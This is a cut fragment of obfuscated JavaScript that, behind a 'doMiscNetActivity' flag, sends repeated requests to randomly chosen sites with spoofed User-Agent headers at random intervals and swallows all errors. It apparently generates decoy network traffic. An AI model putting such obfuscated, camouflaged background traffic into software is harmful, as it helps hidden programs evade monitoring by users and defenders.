  }, -0x15 * -0x11f69 + 0x881 * -0xc2f + 0x86f692);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const a3 = d,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': a3(0x5)
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x696 + -0x1abf + 0x3cad) * getRandomInt(0x1040 + -0x22 * 0x110 + 0x13e1, -0x12f7 + 0xa6 * 0x2c + 0x2 * -0x4c6));
}, -0x17 * -0x185 + 0x8c1 * 0x4 + -0x4593);